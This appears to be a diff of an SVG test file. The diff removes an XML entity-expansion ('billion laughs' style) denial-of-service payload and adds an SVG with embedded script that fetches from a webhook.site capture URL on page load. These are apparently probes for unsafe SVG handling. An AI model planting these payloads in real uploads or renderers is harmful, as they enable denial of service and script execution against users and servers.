@@ -1,17 +1,36 @@
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE data [
-<!ENTITY a0 "dos" >
-<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;">
-<!ENTITY a2 "&a1;&a1;&a1;">
-]>
-<svg width="128px" height="128px"
-	>
-	<style>
-    circle {
-      fill: blue;
-      stroke: black;
-      stroke-width: 2;
-    }
-  </style>
-	<text font-size="16" x="0" y="16">&a2;</text>
+
+<svg
+  width="400"
+  height="180"
+  xmlns="http://www.w3.org/2000/svg"
+  xmlns:xlink="http://www.w3.org/1999/xlink"
+>
+  <script type="text/javascript">
+    <![CDATA[
+      function loadXML() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://webhook.site/e96b0cac-9743-4085-9ba7-8930611a0aef/data.xml", true);
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState == 4 && xhr.status == 200) {
+            var xmlString = xhr.responseText;
+            // Handle XML data here
+            console.log(xmlString);
+          }
+        };
+        xhr.send();
+      }
+
+      // Call loadXML function when SVG is loaded
+      window.onload = function () {
+        loadXML();
+      };
+    ]]>
+  </script>
+  <rect
+    x="10"
+    y="10"
+    width="380"
+    height="160"
+    style="fill:white;stroke:black;stroke-width:2"
+  />
 </svg>
